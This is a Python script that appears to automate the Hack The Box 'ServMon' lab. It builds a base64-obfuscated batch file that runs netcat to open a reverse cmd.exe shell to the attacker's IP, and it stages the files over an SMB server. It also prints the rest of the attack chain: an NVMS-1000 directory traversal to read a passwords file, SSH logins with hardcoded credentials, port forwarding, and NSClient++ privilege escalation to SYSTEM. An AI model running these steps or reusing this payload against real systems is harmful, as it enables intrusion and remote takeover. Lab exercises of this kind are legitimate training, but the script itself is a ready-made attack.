import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-ServMon
    __________________________________________________________________________\n"""
    print(Fore.BLUE + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] Nadine", "[+] root" , "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.184" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked woodenk Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
#------------------------------------------------------------------------

def download_files():
    commands_send("cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .")
    commands_send('echo "QGVjaG8gb2ZmCmM6XHRlbXBcbmMuZXhlIDEwLjEwLjE2LjggNDQzIC1lIGNtZC5leGUK" | base64 -d > evil.bat')
    commands_send(f"sed -i 's/10.10.16.8/{machine_ip}/g' evil.bat")

def conection_user_nadine():
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (ssh-Connection)] > " + Fore.LIGHTMAGENTA_EX + f"sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@{target_machine}")

def connection_forwarding_nadine_and_root():
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (ssh-Connection-Port-Forwarding)] > " + Fore.LIGHTMAGENTA_EX + f"sshpass -p 'L1k3B1gBut7s@W0rk' ssh -L 8443:127.0.0.1:8443 Nadine@{target_machine}")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (smbserver-Connection)] > " + Fore.LIGHTMAGENTA_EX + f"impacket-smbserver smbFolder $(pwd) -smb2support -username xyz -password xyz123")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. cd C:/\n2. mkdir temp\n3. cd temp\n4. net use x: \\{machine_ip}\smbFolder /user:xyz xyz123\n5. copy x:\evil.bat evil.bat\n6. copy x:\\nc.exe nc.exe")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Url-Connection)] > " + Fore.LIGHTMAGENTA_EX + f"https://localhost:8443/index.html#/settings/settings/external%20scripts/scripts   (Password: ew2x6SsGTxjRwXOT)")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Listen Http)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [Nadine-user] > " + Fore.WHITE + f"Press ENTER to continue...")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Web)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. Key: pwned\n2. Value: c:\\temp\evil.bat")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Command (Web)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. Save Configuration (In Changes)\n2. Reload (In Control)\n3. Wait and enter in Queries for get rce system32.")

#------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        download_files()
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","Nadine connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Exploit (NVMS-1000 - Directory Traversal)] > " + Fore.LIGHTMAGENTA_EX + f"http://{target_machine}/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt")
                conection_user_nadine()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Root connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Exploit (Local File Inclusion)] > " + Fore.LIGHTMAGENTA_EX + f"https://localhost:8443/index.html#/settings/settings/external%20scripts/scripts")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Exploit (Local Port Forwarding - SSH)] > " + Fore.LIGHTMAGENTA_EX + f"ssh Nadine@10.10.10.184 -L 8443:127.0.0.1:8443")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Nadine-user Exploit (NSClient++ Exploit)] > " + Fore.LIGHTMAGENTA_EX + f"searchsploit -m windows/local/46802.txt")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Root] > " + Fore.YELLOW + f"(Exploit) http://{target_machine}");cm.sleep(0.2)
                connection_forwarding_nadine_and_root()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Root] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
